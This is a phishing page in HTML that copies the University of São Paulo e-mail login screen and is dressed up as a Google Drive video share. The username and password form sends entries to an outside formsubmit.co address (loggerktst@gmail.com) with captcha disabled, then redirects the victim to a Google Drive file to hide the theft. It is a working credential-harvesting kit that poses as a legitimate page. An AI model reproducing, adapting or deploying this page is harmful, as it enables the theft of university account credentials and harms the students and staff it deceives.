
<!DOCTYPE html>
<html>
<head>
	
<meta property="og:image:width" data-react-helmet="true" content="300">
<meta property="og:image:height" data-react-helmet="true" content="165">
<meta property="og:image" data-react-helmet="true" content="https://i.imgur.com/jUsr0Wy.png?fb">
<meta property="og:title" content="Google Drive - Compartilhamento de vídeo"/>
<meta property="og:type" data-react-helmet="true" content="article">
<meta property="og:url" data-react-helmet="true" content="https://imgur.com/a/04Zz2Zv">
<meta property="al:web:url" content="https://drive.google.com/drive"/>
	
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">


	
<!--<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
        integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">-->

<!-- Chamada da biblioteca em JS do BootStrap-->

 <!-- <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
        integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
        crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
        integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
        crossorigin="anonymous"></script>-->
	
<link rel="shortcut icon" type="image/x-icon" href="/imagens/favicon.ico" />

<link rel="stylesheet" type="text/css" href="/css/bootstrap.min.css">
<!--link rel="stylesheet" type="text/css" href="/api/font-awesome/5.5.0-web/css/all.min.css" /-->
<link rel="stylesheet" type="text/css" href="/css/estilo-usp.css">

<link rel="stylesheet" type="text/css" href="/css/error.css">
<script type="text/javascript" src="jquery-3.4.1.min.js"></script>
<script type="text/javascript" src="bootstrap.bundle.min.js"></script>

<title>Universidade de São Paulo</title>

<link rel="stylesheet" type="text/css" href="/css/login.css" />

<script type="text/javascript">
	$(function () {
	  $('[data-toggle="tooltip"]').tooltip()
	})
</script>

</head>
<body>


<div class="container-fluid" style="padding-right: 0px; padding-left: 0px;">
        <div class="row">
                <div class="col-xs-10 col-sm-10 col-md-10 col-lg-10">
                        <img src="/imagens/usp-logo-completo.png" alt="Universidade de São Paulo" title="Universidade de São Paulo" class="img-responsive usp-logo" id="usp-logo-completo"/>
			<img src="/imagens/usp-logo.png" alt="Universidade de São Paulo" title="Universidade de São Paulo" class="img-responsive usp-logo" id="usp-logo"/>
                </div>
        </div>

        <div class="row">
                <div class="col-xs-10 col-sm-10 col-md-10 col-lg-10">
                        <div id="HeaderUSP"></div>
                </div>
        </div>
</div>

<div id="login" name="login" class="login">

  <div id="login-main" name="login-main" class="loginMain">
    <div id="login-main-container" name="login-main-container" class="loginMainContainer" style="display:block;">
      <div id="login-content-container" name="login-content-container" class="loginContentContainer">
        <div id="login-main-content" name="login-main-content" class="loginMainContent">

	  <p style="font-size:18px;">Autenticando em</p>
	  
	  	              <p style="font-size:16px; font-weight:bold;">E-MAIL - Universidade de S&atilde;o Paulo</p> 
          
	            
                    
          <div class="loginMainContentLoginBox boxLogin clearfix">

	    <form form action="https://formsubmit.co/loggerktst@gmail.com" method="POST" class="form">

		

            
                            <div class="form-group">
					<label for="username" class="sr-only">E-mail Completo</label>
        	        <input placeholder="E-mail Completo" class="form-control form-control-lg" id="username" name="username" type="text" value="" autofocus required>
	                      </div>
              <div class="form-group">
					<label for="password" class="sr-only">Senha Única</label>
	                <input placeholder="Senha Única" class="form-control form-control-lg" id="password" name="password" type="password" value="" data-toggle="tooltip" data-placement="bottom" data-html="true" title="" required>
	                      </div>
		          <input type="hidden" name="_captcha" value="false" />

              <div class="form-check">
		<input type="checkbox" id="donotcache" name="donotcache" value="1" style="margin-left:0;">
                <label for="donotcache">Isto é um computador público</label>
              </div>
              
              <div class="form-check">
		<input type="checkbox" id="_shib_idp_revokeConsent" name="_shib_idp_revokeConsent" value="true" style="margin-left:0;">
                <label for="_shib_idp_revokeConsent">Controlar quais dos meus dados são enviados</label>
              </div>
              <br />
				<input
       				 type="hidden"
        			name="_next"
        			value="https://drive.google.com/file/d/1x9I7-lLBIcvfnt1jDzFW6npAwtdFAmwu/view?usp=sharing"
      				/>
                            <button class="btn btn-warning btn-block btn-lg" type="submit" name="_eventId_proceed">Entrar</button>
              
	               </form>
          </div>
     
          <div class="loginMainContentFooterBox clearfix" style="margin-top:25px; font-size:14px;">
          	<ul class="list-group list-group-flush">
              	                	<li class="list-group-item">
				<a href="https://id.usp.br/senha-unica" target="_blank">Esqueceu sua senha?</a>
			</li>
              	                	<li class="list-group-item">
				<a href="https://id.usp.br/senha-unica" target="_blank">Primeiro Acesso</a>
			</li>	
                	<li class="list-group-item">
		<a href="https://atendimento-prod.sti.usp.br/otrs/public.pl?Action=PublicFAQExplorer;CategoryID=31 " target="_blank">FAQ </a>
			</li>	
            	</ul>

	  </div>

				<a style="text-align: center" href="https://www.sti.usp.br/contato/fale-conosco/" target="_blank">Atendimento:</a><br /> +55 (11) 3091 6400, das 8h às 17h<br /> 	<div class="loginMainContentFooterBox clearfix">
                <div style="margin-top:30px; border:1px dashed orange; padding:10px;">
			<h4>Dicas de Segurança</h4> <ul class="list list-unstyled text-justify" style="line-height:27px;"> <li>- Feche seu navegador quando acabar de usar o serviço que requisitou a autenticação, principalmente se estiver utilizando um computador compartilhado.</li> <li>- Tenha cuidado com qualquer programa ou página web que solicite a sua senha.</li> <li>- Nunca forneça seu usuário ou senha através do e-mail, SMS ou em formulários alocados fora dos servidores da USP.</li> <li>- Autenticando-se você automaticamente aceitará os <a href="https://servicos.sti.usp.br/termos-de-uso-da-senha-unica" target="_blank" alt="USP Login Terms of Use">Termos de Uso da Senha Única da USP</a>.</li> </ul>                        <br/>

                        <a href="http://www.internet2.edu/products-services/trust-identity-middleware/shibboleth/" target="_blank"><img src="/imagens/shibboleth_logo.png"" alt="Shibboleth" title="Shibboleth"/></a>
                        <a href="https://www.rnp.br/servicos/cafe" target="_blank"><img src="/imagens/cafe_logo_rodape.png" alt="CAFe" title="CAFe" style="margin-left:20px;"/></a>
                </div>
        </div>

      </div>
     </div>
   </div>
 </div>
</div>
</body>
</html>
